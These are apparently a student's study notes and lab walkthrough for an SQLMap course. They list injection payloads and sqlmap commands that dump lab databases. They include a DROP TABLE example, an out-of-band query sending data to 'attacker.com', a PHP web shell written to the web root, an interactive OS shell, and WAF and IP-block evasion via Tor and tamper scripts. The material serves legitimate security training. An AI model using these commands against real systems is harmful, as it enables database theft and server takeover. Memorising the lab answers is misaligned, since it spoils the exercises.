# Getting Started

## SQLMap Overview

This section covers how to install sqlmap and the different types of sql injection it allows you to use.

SQLMap covers:
Boolean-based blind SQL Injection
An example of this inject would be 
``` sql
AND 1=1
```

Error-based SQL Injection
An example of this injection would be 
``` sql
AND GTID_SUBSET(@@version,0)
```
This is the second fastest injection

UNION query-based
An example of this injection would be 
``` sql 
UNION ALL SELECT 1,@@version,3
```
This is the fastest and best injection

Stacked queries
An example of this 
``` sql
; DROP TABLE users
```

Time-based blind SQL Injection
Example 
``` sql 
AND 1=IF(2>1,SLEEP(5),0)
```

Inline queries
Example 
``` sql
SELECT (SELECT @@version) from
```

Out-of-band SQL Injection
Example 
``` sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

## Getting Started with SQLMap

This section just covers how to use the help parameters in sqlmap and how to run a basic query.

## SQLMap Output Description

This section just covers the ourput of sqlmao after it is run.

# Building Attacks

## Running SQLMap on an HTTP Request

The best to run sql map is to copy the curl URL in Dev tools and paste it into the command line. Then just change curl to sqlmap.

For get parameters, that will likely be included in the URL. 

For post parameters, we can use the --data paramameter like `--data 'uid=1&name=test'`

If we need to use a full HTTP request. We can use the -r flag and provide a request a file. These full requests can usually be captured in applications like burp.

We can also add our on hand crafted SQLMap requests. For instance if our request needs to use a specific cookie we can use the --cookie parameter like `--cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` or we can use the -H/--header parameter like `-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`

There are some other things they cover here like we can provide a request file in XML or JSON format, and that we can use a random agent if we desire.

The questions in this section are:

What's the contents of table flag2? (Case #2) 

For this one, we can run:
`sqlmap 'http://83.136.249.57:50029/case2.php' --compressed -X POST -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.249.57:50029/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://83.136.249.57:50029' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'id=1'`

This identifies that the id parameter is vulnerable to a list of SQLi including union and that it has 9 columns.

Running the below command gave me the the database I was on.
``` SQL
id=1 UNION ALL SELECT NULL,NULL,NULL,database(),NULL,NULL,NULL,NULL,NULL-- -
```

This command gave me the tables in testdb
``` SQL
id=1 UNION ALL SELECT NULL,NULL,NULL,TABLE_NAME,TABLE_SCHEMA,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.TABLES where table_schema='testdb'-- -
```

This gave me the column names in flag2
``` SQL
id=1 UNION ALL SELECT NULL,NULL,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA,NULL,NULL,NULL,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='flag2'-- -
```

This gave me the flag
``` SQL
id=1 UNION ALL SELECT NULL,NULL,id,content,NULL,NULL,NULL,NULL,NULL from flag2-- -
```

Apparently I could just run SQLMap with --dump --batch and this answer would have been shown automatically.

What's the contents of table flag3? (Case #3) 

Running the below command gets the answer because it runs a batch set of tests and dumps the output, so it automatically dumps the table of flag3
`sqlmap 'http://83.136.249.57:50029/case3.php' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://83.136.249.57:50029/case3.php' -H 'Connection: keep-alive' -H 'Cookie: id=1*' -H 'Upgrade-Insecure-Requests: 1' --dump --batch`

What's the contents of table flag4? (Case #4) 

For this one, I needed to start Burp Suite and visit the web page to get the request. Then I copied that into a file and ran:
`sqlmap -r Case4Request.txt --batch --dump`

This got the answer.

## Handling SQLMap Errors

This section covers how to handle errors when trying to run SQLMap.

The first thing to do is add the  --parse-errors flag, which displays the DBMS errors as part of the run.

The -t flag stores all the traffic content to an output file.

The -v gives verbose output. For instance -v 6 prints all errors and full HTTP request to the terminal.

We can also use the --proxy parameter to route all the traffic through a proxy like burp.

## Attack Tuning

This section covers how to make SQLMap do more and fine tune it to be more likely to succeed.

The first thing we can do is increase the risk (1-3) and level (1-5).

To do this we can add the flag like --level=5 --risk=5

We can also use the -T flag to target a specific table like -T flag5

We can use the --dump flag to dump the results to a file, and --flush-session so it does not save the session variables.

We can add --prefix and --suffix to make sure our test string is wrapped in a specific string. 

The questions in this section are:

What's the contents of table flag5? (Case #5) 

To get the answer for this section we can run this test with a higher level and risk, but the hint also mentions using -T to specificy the table being tested.

`sqlmap 'http://83.136.251.235:53338/case5.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case5.php' -H 'Upgrade-Insecure-Requests: 1' --batch --dump --level=5 --risk=3 -T flag5 --no-cast --dump -D testdb --flush-session`

What's the contents of table flag6? (Case #6) 

The hint on this section says use '`)' as the prefix, so I just ran the SQLMap with that and --batch and --dump

`sqlmap 'http://83.136.251.235:53338/case6.php?col=id' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case6.php' -H 'Upgrade-Insecure-Requests: 1' --prefix '`)' --batch --dump`

What's the contents of table flag7? (Case #7) 

The hint on this one mentions counting the number of columns in the output and specifying it for SQLMap. Running the below gets the answer.
`sqlmap 'http://83.136.251.235:53338/case7.php?id=1' --compressed -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://83.136.251.235:53338/case7.php' -H 'Upgrade-Insecure-Requests: 1' --union-cols=5 --batch --dump`

# Database Enumeration

## Database Enumeration

This section covers flags we can use to perform database enumeration.

We can use the --banner flag to get the sql version we are on.

We can use --hostname to get the hostname of the target

--current-user gives the current user

--current-dn is the current database

--is-dba gets if the current user is a dba

We can use --tables option to get all the tables in a database and -D for the database.

We can use -T to get the content of a specific table.

We can use --dump to output the content of a table like:
`sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb`

If we want only a set of a columns we can use -C

We can use --start and --stop to define how many rows we want.

And we can use --where to add a WHERE clause to our search

If we want to retrieve all the tables in a database we can just skip the -T and use --dump -D <DB>

If we want all the the databases' content we can use --dump-all, but we should add --exclude-sysdbs

The question in this section is:
What's the contents of table flag1 in the testdb database? (Case #1) 

We can use `sqlmap -u "http://83.136.253.251:43123/case1.php?id=1" --dump -D testdb -T flag1`

## Advanced Database Enumneration

If we want to get the structure of all the tables we can use --schema

If we are dealing with a complex database structure we can search for things of interest using --search
Example: `sqlmap -u "http://www.example.com/?id=1" --search -T user` gets all table names that are similar to user

We can search for passwords too.
Example: `sqlmap -u "http://www.example.com/?id=1" --search -C pass`

This gets all columns like password. Then we can dump that table if we want and it will automatically attempt to password crack

We can use the --passwords flag to attempt to dump the contents of system tables containing database specific credentials (like connection creds).

The --all switch with --batch switch will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.

The questions in this section:

What's the name of the column containing "style" in it's name? (Case #1) 

To get this all we have to do is search for a column
`sqlmap -u "http://83.136.253.251:43123/case1.php?id=1" --search -C style`

What's the Kimberly user's password? (Case #1) 

We can use SQLMap to crack passwords on a certain table like this:
`sqlmap -u "http://83.136.253.251:43123/case1.php?id=1" --dump -D testdb -T users`

# Advanced SQLMap Usage

## Bypassing Web Application Protections

One of the ways people prevent unwanted automation and prevent scenarios with malicious links is Anti-CSRF tokens. But SQLMap can attempt to automatically bypass this if we add the --csrf-token flag like `--csrf-token="csrf-token"`

In some cases, web apps may require unique values to be provided in predefined parameters. For this we can use the --randomize flag for that parameter like `sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5`

Another similar mechanism is wehre a web app expects a proper parameter value to be calculated based on some other parameters value. Most often, one parameter value has to contain the message digest of another one. To bypass this, we can use --eval and provide it valid Python code like:
`sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI`

If we need to conceal our IP address, or if it has been blacklisted, we can try to use a proxy or the anonymity network Tor. We canset a proxy using --proxy like `--proxy="socks4://177.39.187.70:33283"` 

Or if we have a list of proxies we can provide them to SQLMap using --proxy-file

Or we can use the Tor network, where our IP can appears as anywhere from a list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using --tor, SQLMap will automatically try to find the local port and use it.

If we want to be sure Tor is properly being used, we can use the --check-tor flag. SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result. We will get Congratulations if it working correctly.

SQLMap automatically attempts to determine if there is a WAF in place and what type. We can skip this check if we want with --skip-waf

If we get immediate problems, one of the first things we should of is potential blacklisting of the default user agent for SQLMap. We can bypass this easily with --random-agent

Finally, we can use the --tamper switch to make changes to our requests right before sending them. Like --tamper=between,randomcase.

There are a lot of these:
```
0eunion 	Replaces instances of UNION with e0UNION
base64encode 	Base64-encodes all characters in a given payload
between 	Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #
commalesslimit 	Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart
equaltolike 	Replaces all occurrences of operator equal (=) with LIKE counterpart
halfversionedmorekeywords 	Adds (MySQL) versioned comment before each keyword
modsecurityversioned 	Embraces complete query with (MySQL) versioned comment
modsecurityzeroversioned 	Embraces complete query with (MySQL) zero-versioned comment
percentage 	Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)
plus2concat 	Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart
randomcase 	Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)
space2comment 	Replaces space character ( ) with comments `/
space2dash 	Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)
space2hash 	Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)
space2mssqlblank 	Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters
space2plus 	Replaces space character ( ) with plus (+)
space2randomblank 	Replaces space character ( ) with a random blank character from a valid set of alternate characters
symboliclogical 	Replaces AND and OR logical operators with their symbolic counterparts (&& and ||)
versionedkeywords 	Encloses each non-function keyword with (MySQL) versioned comment
versionedmorekeywords 	Encloses each keyword with (MySQL) versioned comment
```

The questions for this section are:
What's the contents of table flag8? (Case #8) 

Running `sqlmap -u "http://94.237.56.188:56678/case8.php" --data="id=1&t0ken=cWzQ6Vr2JJcZ1xDrKfC3a2ckxb7mIxWeHcAmCWgAkdI" --csrf-token="t0ken" --level=5 --risk=3 -T flag8 --dump` get the answer

I found the name of the token by looking at the request in network in dev tools. 

What's the contents of table flag9? (Case #9)

Running `sqlmap -u "http://94.237.56.188:56678/case9.php?id=1&uid=480471076" --randomize=uid --batch --dump -T flag9` gets the answer

What's the contents of table flag10? (Case #10)

This one I ran with level=5 and risk=3 and it was taking forever, so I peaked at `https://medium.com/@joshthedev/step-13-sqlmap-essentials-68829d907492` and it looks like all that needed to be done was put the request in a file and try again? This is literally the same thing we did in case4 so I am not sure what this was testing.

What's the contents of table flag11? (Case #11) 

The page mentions Filtering of characters '<', '>'. The hint says to choose the correct tamper script. Running sqlmap --list-tampers you find the between tamper removes < and >.

Running `sqlmap -u "http://94.237.56.188:56678/case11.php?id=1" --dump --batch --tamper=between` gets the answer.

## OS Exploitations

It is possible to get remote code execution using sql injection, if we have the correct priviliges. We can use sqlmap to test this using the --is-dba flag, if this returns true than we very likely have the priviliges we desire. 

If we do have the priviliges we want, we can use the --file-read option in SQLMap to read files like:
`sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`

For writing files, it is much less likely because a compromised DB with write permissions can give remote code execution and lose the server. But it is still worth trying.

We can use --file-write and --file-dest. First we will put a basic php script into shell.php.
We can do something like `echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Then we can try to write that file to the server `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`

If we do verify that we can write files, sqlmap has a way to potentially write a shell without us needing to write any php files. We can use the --os-shell command for this.

The questions in this section are: 
Try to use SQLMap to read the file "/var/www/html/flag.txt".

Running `sqlmap -u "http://83.136.253.251:52859/?id=1" --file-read "/var/www/html/flag.txt"` gets the answer

Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host. 

Running `sqlmap -u "http://83.136.253.251:52859/?id=1" --os-shell --technique=E` gets remote code execution, then we can run `ls ../../../` to find the flag, and `cat ../../../flag.txt` to get it

# Skills Assessment

## Skills Assessment

All this says is:
What's the contents of table final_flag?

To get this, I first just ran SQLMap with --level=5 and --risk=3 and mapped the site. This didn't find anything, so I played with the site a little in BURP and found a request submitting an ID. So I put that in a file and ran it again with same risk. After a while it found a time based vuln, but then failed. So I tried re-running target the table and database. That didn't work. So I added the tamper script we used before and this worked. Got the answer with:
`sqlmap -r FinalCase.txt --dump --batch -p id -D production -T final_flag --technique=T --tamper=between`
